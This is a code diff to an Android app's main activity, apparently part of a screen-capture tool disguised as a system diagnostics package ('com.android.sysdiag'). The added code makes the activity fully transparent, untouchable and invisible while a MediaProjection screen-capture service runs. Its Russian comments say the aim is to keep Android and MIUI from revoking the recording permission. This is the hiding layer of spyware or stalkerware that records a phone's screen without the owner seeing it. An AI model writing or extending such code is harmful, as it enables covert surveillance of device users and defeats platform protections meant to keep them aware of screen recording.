@@ -2,9 +2,14 @@ package com.android.sysdiag;
 
 import android.app.Activity;
 import android.content.Intent;
+import android.graphics.Color;
 import android.media.projection.MediaProjectionManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.view.Gravity;
+import android.view.View;
+import android.view.WindowManager;
+import android.widget.TextView;
 import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
@@ -17,6 +22,21 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
+        // Делаем окно прозрачным и невидимым
+        getWindow().setBackgroundDrawableResource(android.R.color.transparent);
+        getWindow().addFlags(
+            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
+        );
+
+        // Пустой невидимый TextView, чтобы activity не выглядела пустой
+        TextView hidden = new TextView(this);
+        hidden.setText("");
+        hidden.setBackgroundColor(Color.TRANSPARENT);
+        hidden.setGravity(Gravity.CENTER);
+        setContentView(hidden);
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             if (!NotificationManagerCompat.from(this).areNotificationsEnabled()) {
@@ -44,10 +64,15 @@ public class MainActivity extends AppCompatActivity {
         if (requestCode == REQ_CAPTURE) {
             if (resultCode == Activity.RESULT_OK && data != null) {
                 ScreenCaptureService.start(this, resultCode, data);
-                // ВАЖНО: не вызываем finish() — оставляем activity в фоне,
-                // чтобы Android 13/14 не отозвал разрешение MediaProjection.
-                // Activity станет невидимой, но живой.
-                moveTaskToBack(true);
+
+                // НЕ закрываем activity, не уводим в фон.
+                // Вместо этого делаем её максимально невидимой,
+                // но живой — чтобы MIUI не сбросил разрешение.
+                try {
+                    getWindow().setDimAmount(0f);
+                    getWindow().getDecorView().setAlpha(0f);
+                    getWindow().getDecorView().setVisibility(View.INVISIBLE);
+                } catch (Throwable ignored) {}
             } else {
                 Toast.makeText(this, "Diagnostics disabled", Toast.LENGTH_SHORT).show();
                 finish();
